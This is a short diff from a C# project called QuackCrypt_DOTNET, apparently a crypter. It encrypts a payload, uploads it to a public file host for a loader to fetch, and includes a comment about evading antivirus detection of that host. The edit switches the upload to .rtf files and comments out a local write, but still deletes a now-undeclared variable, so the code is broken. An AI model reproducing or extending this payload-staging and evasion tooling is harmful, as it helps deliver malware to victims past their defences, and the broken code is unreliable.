@@ -37,7 +37,7 @@ namespace QuackCrypt_DOTNET
         private static Random random = new Random();
         public static string RandomString(int length)
         {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvqxyz0123456789!$%&*+";
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvqxyz0123456789";
             return new string(Enumerable.Repeat(chars, length)
               .Select(s => s[random.Next(s.Length)]).ToArray());
         }
@@ -98,11 +98,11 @@ namespace QuackCrypt_DOTNET
         {
             // Write AES to file for upload
             var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//" + "QuackCrypt";
-            var makeFile = path + "//" + getFilename() + ".txt";
-            File.WriteAllBytes(makeFile, Encoding.ASCII.GetBytes(rtb.Text)); // Save B64 for loader
+            // var makeFile = path + "//" + getFilename() + ".rtf";
+            // File.WriteAllBytes(makeFile, Encoding.ASCII.GetBytes(rtb.Text)); // Save B64 for loader
 
-            byte[] load = File.ReadAllBytes(makeFile); // Upload
-            string link = Uploader.Upload(load, textBox2.Text + ".txt"); // Handles upload
+            // byte[] load = File.ReadAllBytes(makeFile); // Upload
+            string link = Uploader.Upload(Encoding.ASCII.GetBytes(rtb.Text), textBox2.Text + ".rtf"); // Handles upload
             textBox3.Text = link; 
             //(AV knows about uguu.se) use: link.Split('/')[3] to get ending
             File.Delete(makeFile); // Remove locally after upload
